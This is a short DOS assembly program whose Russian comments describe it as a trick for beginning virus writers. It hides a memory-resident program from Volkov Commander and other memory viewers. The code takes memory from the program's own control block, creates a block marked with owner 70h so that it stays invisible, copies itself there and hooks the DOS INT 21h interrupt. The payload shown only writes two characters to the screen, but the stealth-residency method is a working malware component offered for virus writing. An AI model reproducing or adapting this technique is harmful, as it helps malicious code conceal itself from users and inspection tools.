;Невидимые резидентки - основная трудность для начинающих вирмакеров
;Эта  программа демонстрирует, как можно обмануть Volcov Commander и
;другие вьюверы памяти

;Здесь используется создание собственного блока памяти и защита  его
;маркером 70h (невидим полностью)

;Этот прикол был выдран из WG-728. Sorry!..

.model tiny
.code
const1  equ offset end_v-offset start
const2  equ (offset end_v-offset start+100h)/16+1
	org 100h
start:
	mov ax,3521h
	int 21h
	mov cs:[old_i],bx
	mov cs:[old_i+2],es

	mov bp,cs
	mov ax,bp
	dec ax
	mov ds,ax
	xor di,di
	xchg [di+3],bx
	sub bx,const2+1
	mov [di+3],bx
	add bx,bp
	mov es,bx
	mov al,[di]
	push di
	stosb
	mov byte ptr [di-1],4dh
	mov ax,70h
	stosw
	mov ax,const2
	stosw
	pop di
	inc bx
	mov es,bx
	mov cx,const1
	push cs
	pop ds
	mov si,100h
	mov di,si
	cld
	rep movsb
	push es
	pop ds
	mov dx,offset new_21
	mov ax,2521h
	int 21h
	mov ax,4c00h
	int 21h

new_21:
	push es ax
	mov ax,0b800h
	mov es,ax
	mov word ptr es:[2],'CS'
	pop ax es
	db 0eah
old_i	dw 0,0
end_v:
end start
